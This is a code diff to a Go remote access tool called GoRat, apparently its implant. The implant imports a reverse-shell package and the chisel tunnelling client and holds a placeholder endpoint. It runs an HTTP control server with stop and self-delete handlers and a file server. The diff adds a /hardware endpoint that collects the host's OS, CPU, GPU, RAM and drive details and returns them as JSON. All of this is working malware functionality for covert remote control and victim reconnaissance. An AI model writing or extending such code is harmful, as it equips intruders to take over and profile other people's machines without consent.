@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"math/rand"
 	"net/http"
@@ -10,6 +11,8 @@ import (
 	"time"
 
 	ssh "github.com/JustinTimperio/GoRat/shell"
+	"github.com/JustinTimperio/osinfo"
+	"github.com/jaypipes/ghw"
 	chisel "github.com/jpillora/chisel/client"
 	cos "github.com/jpillora/chisel/share/cos"
 )
@@ -17,6 +20,18 @@ import (
 var (
 	endpoint_url = "@ENDPOINT_HERE@"
 )
+
+type Hardware struct {
+	Runtime   string
+	OSArch    string
+	OSName    string
+	OSVersion string
+	CPU       string
+	Cores     uint32
+	RAM       string
+	GPU       string
+	Drives    string
+}
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
@@ -36,11 +51,10 @@ func ControlServer(BasePort int) {
 	controlPort := strconv.Itoa(BasePort + 1)
 
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		fmt.Fprintf(w, "OK")
+		fmt.Fprintf(w, "OK\n")
 	})
 
 	http.HandleFunc("/stop", func(w http.ResponseWriter, r *http.Request) {
-		fmt.Fprintf(w, "OK")
 		existenceIsPain()
 	})
 
@@ -49,9 +63,38 @@ func ControlServer(BasePort int) {
 		if err != nil {
 			existenceIsPain()
 		}
-		fmt.Fprintf(w, ex)
 		os.Remove(ex)
 		existenceIsPain()
+	})
+
+	http.HandleFunc("/hardware", func(w http.ResponseWriter, r *http.Request) {
+		info := Hardware{}
+		// No Error Handling I Know
+		release := osinfo.GetVersion()
+		memory, _ := ghw.Memory()
+		block, _ := ghw.Block()
+		gpu, _ := ghw.GPU()
+		cpu, _ := ghw.CPU()
+
+		for _, proc := range cpu.Processors {
+			info.CPU = proc.Model
+		}
+		for _, vc := range gpu.GraphicsCards {
+			info.GPU = vc.DeviceInfo.Product.Name
+		}
+
+		info.Runtime = release.Runtime
+		info.OSArch = release.Arch
+		info.OSName = release.Name
+		info.OSVersion = release.Version
+
+		info.Cores = cpu.TotalThreads
+		info.RAM = memory.String()
+		info.Drives = block.String()
+
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(info)
+
 	})
 
 	fs := http.FileServer(http.Dir(getPaths()))
